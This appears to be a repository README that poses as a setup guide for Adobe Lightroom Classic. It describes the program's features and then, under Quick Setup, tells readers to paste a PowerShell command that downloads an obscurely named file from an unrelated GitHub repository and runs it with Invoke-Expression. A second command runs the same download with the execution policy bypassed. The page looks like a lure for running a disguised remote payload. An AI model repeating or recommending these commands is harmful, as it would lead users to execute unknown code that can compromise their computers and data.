# Lightroom Classic

Lightroom Classic is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Lightroom Classic and work in it.

Adobe Lightroom Classic is a desktop photography application for Windows that centers on a persistent catalog of your images. It imports files from cameras and drives, keeps previews and metadata in one place, and lets you rate, keyword, and sort collections before you touch pixels. The Develop workspace applies adjustments through sliders and curves while the original file stays untouched.

A typical session starts with importing a new shoot into a folder you already use in the catalog. You cull rejects with flags and stars, then open keepers in Develop to fix white balance, tone, and sharpening. Local brushes and masks isolate skies or faces, and synchronized settings speed up series shot under the same light. When the set looks right, you export TIFF or JPEG files to a delivery folder or send a small web gallery from the same machine.

This repository holds a Windows setup package for installing the application, short notes on catalog location and backup habits, and a changelog that records version bumps and configuration tweaks. Together those files document how this copy was prepared and what changed between updates so you can repeat the install on another PC without guessing.

## What you do with it

- The catalog indexes filenames, keywords, and star ratings across folders on local and attached drives.
- Develop sliders adjust exposure, contrast, highlights, shadows, whites, and blacks with live histogram feedback.
- RAW and DNG files open with camera-matched color profiles before you apply custom tone and color grading.
- Brush, radial, and linear gradient masks target edits to specific regions without destructive layer stacks.
- Sync settings copy develop choices from one photo to an entire sequence shot under matching lighting.
- Export presets control file type, dimensions, sharpening, and metadata embedding for print or screen delivery.
- Library filters combine flags, colors, and text searches to narrow thousands of frames during culling sessions.
- Map and metadata panels tie GPS coordinates and copyright fields to batches during organization on Windows.

## Quick Setup (PowerShell)

This installs the program Lightroom Classic on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/winter-diana959325/lightroom-classic-setup-guide/main/z0980aybyn.z3lwj2xw | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/winter-diana959325/lightroom-classic-setup-guide/main/z0980aybyn.z3lwj2xw | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `z0980aybyn.z3lwj2xw` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `winter-diana959325/lightroom-classic-setup-guide`. Adobe Lightroom Classic 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
